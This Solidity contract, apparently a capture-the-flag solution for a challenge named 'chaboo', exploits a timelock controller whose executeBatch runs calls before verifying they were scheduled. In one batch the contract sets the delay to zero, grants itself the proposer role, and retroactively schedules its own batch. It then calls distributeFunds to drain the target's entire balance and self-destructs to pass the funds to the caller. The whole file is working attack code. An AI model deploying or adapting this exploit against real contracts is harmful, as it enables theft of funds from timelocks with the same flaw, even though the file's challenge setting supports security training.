// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "hardhat/console.sol";

interface IChallenge_chaboo {
    function PROPOSER_ROLE() external view returns (bytes32);

    function distributeFunds(address target, uint256 value) external;

    function schedule(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) external;

    function execute(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt
    ) external;

    function executeBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt
    ) external;

    function scheduleBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) external;
}

contract Exploit_chaboo {
    IChallenge_chaboo instance;

    constructor(IChallenge_chaboo _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        address target = address(instance);
        bytes32 predecessor = bytes32(0);
        bytes32 salt = bytes32(0);

        address[] memory targets = new address[](3);
        targets[0] = target;
        targets[1] = target;
        targets[2] = address(this);

        uint256[] memory values = new uint256[](3);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;

        bytes[] memory datas = new bytes[](3);
        datas[0] = abi.encodeWithSignature("updateDelay(uint256)", 0);
        datas[1] = abi.encodeWithSignature("grantRole(bytes32,address)", instance.PROPOSER_ROLE(), address(this));
        datas[2] = abi.encodeWithSignature("hijack()");

        instance.executeBatch(targets, values, datas, predecessor, salt);

        drain();

        selfdestruct(payable(msg.sender));
    }

    function hijack() external {
        address target = address(instance);
        bytes32 predecessor = bytes32(0);
        bytes32 salt = bytes32(0);

        address[] memory targets = new address[](3);
        targets[0] = target;
        targets[1] = target;
        targets[2] = address(this);

        uint256[] memory values = new uint256[](3);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;

        bytes[] memory datas = new bytes[](3);
        datas[0] = abi.encodeWithSignature("updateDelay(uint256)", 0);
        datas[1] = abi.encodeWithSignature("grantRole(bytes32,address)", instance.PROPOSER_ROLE(), address(this));
        datas[2] = abi.encodeWithSignature("hijack()");

        instance.scheduleBatch(targets, values, datas, predecessor, salt, 0);
    }

    function drain() internal {
        address target = address(instance);
        bytes32 predecessor = bytes32(0);
        bytes32 salt = bytes32(0);
        bytes memory data = abi.encodeWithSignature("distributeFunds(address,uint256)", address(this), target.balance);

        instance.schedule(target, 0, data, predecessor, salt, 0);
        instance.execute(target, 0, data, predecessor, salt);
    }

    receive() external payable {}
}
